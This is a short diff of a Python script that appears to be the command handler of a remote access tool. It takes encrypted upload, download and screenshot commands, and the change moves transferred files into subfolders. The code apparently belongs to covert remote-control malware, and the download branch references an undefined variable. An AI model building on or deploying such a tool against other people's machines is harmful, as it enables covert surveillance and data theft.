@@ -10,8 +10,7 @@ from Crypto.Random import get_random_bytes
 import binascii
 import subprocess
 import platform
-import shutil
-
+import base64
 def signal_handler(sig, frame):
     global should_exit
     print("\n [<-] Saliendo...")
@@ -44,15 +43,19 @@ def decrypt(ciphertext, key):
 def handle_command(cmd, key):
     if cmd.startswith('upload'):
         _, filename = cmd.split(' ', 1)
-        with open(filename, 'rb') as f:
+        upload_path = os.path.join('upload', filename)
+        with open(upload_path, 'rb') as f:
             data = f.read()
         return data
 
     elif cmd.startswith('download'):
         _, filename = cmd.split(' ', 1)
-        with open(filename, 'wb') as f:
+        download_path = os.path.join('download', filename)
+        if not os.path.exists('download'):
+            os.makedirs('download')
+        with open(download_path, 'wb') as f:
             f.write(decrypt(base64.b64decode(data), key))
-        return f'{filename} downloaded successfully'
+        return f'{download_path} downloaded successfully'
 
     elif cmd == 'screenshot' and screenshot_available:
         screenshot = ImageGrab.grab()
